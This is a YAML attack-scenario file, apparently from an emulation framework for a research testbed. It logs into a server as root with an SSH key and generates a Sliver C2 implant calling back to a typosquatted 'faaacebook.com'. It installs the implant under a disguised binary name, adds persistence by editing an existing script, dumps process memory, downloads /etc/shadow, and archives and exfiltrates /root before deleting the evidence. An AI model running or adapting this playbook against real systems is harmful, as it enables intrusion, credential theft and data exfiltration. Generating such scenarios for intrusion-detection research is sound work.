####################
#
# Scenario 2 a a
#
####################

vars:
  $SERVER_ADDRESS: 192.42.0.254
  $ATTACKER_ADDRESS: 192.42.1.174
  $DNS_SERVER: 192.42.0.233
  $DOMAIN: aecid-testbed.com
  $USER: aecid
  $SSH_KEY: "{{user_home.stdout}}/.ssh/privesc_key_videoserver"
  $IMPLANTPATH: /tmp/superimplant

commands:
  - type: ssh
    cmd: hostname
    hostname: $SERVER_ADDRESS
    port: 2222
    username: root
    key_filename: $SSH_KEY
    creates_session: "root"

  - type: sliver
    cmd: "generate_implant"
    c2url: "https://faaacebook.com"
    name: "superimplant"
    filepath: $IMPLANTPATH

  - type: sliver
    cmd: start_https_listener
    host: 0.0.0.0
    port: 443

  - type: shell
    cmd: ls $IMPLANTPATH

  - type: sftp
    cmd: put
    local_path: "$IMPLANTPATH"
    remote_path: /usr/bin/zmcontroller
    mode: 755
    session: "root"

  - type: ssh
    cmd: sed -i 's/#!\/bin\/sh/#!\/bin\/sh\n\/usr\/bin\/zmcontroller \&\n/' /usr/share/awffull/awffull
    session: "root"

  - type: sliver-session
    cmd: ls
    remote_path: "."
    session: superimplant

  - type: sliver-session
    cmd: ps
    session: superimplant

  - type: regex
    cmd: (\d+) .*mariadb
    output:
      PROCESS: "$MATCH_0"

  - type: debug
    cmd: "$PROCESS"

  - type: mktemp
    variable: TEMPPROCDUMP

  - type: sliver-session
    cmd: process_dump
    pid: 1
    session: superimplant
    local_path: $TEMPPROCDUMP

  - type: sliver-session
    cmd: netstat
    session: superimplant

  - type: sliver-session
    cmd: ifconfig
    session: superimplant

  - type: mktemp
    variable: SHADOW

  - type: sliver-session
    cmd: download
    remote_path: /etc/shadow
    local_path: $SHADOW
    session: superimplant

  - type: sliver-session
    cmd: execute
    exe: /usr/bin/tar
    args:
      - cvzf
      - /tmp/r.tar.gz
      - /root
    session: superimplant

  - type: mktemp
    variable: ROOTTAR

  - type: mktemp
    variable: ROOTTAR2

  - type: sliver-session
    cmd: download
    remote_path: /tmp/r.tar.gz
    local_path: $ROOTTAR
    session: superimplant

  - type: sliver-session
    cmd: rm
    remote_path: /tmp/r.tar.gz
    session: superimplant

  - type: sliver-session
    cmd: download
    remote_path: /root
    local_path: $ROOTTAR2
    recurse: True
    session: superimplant


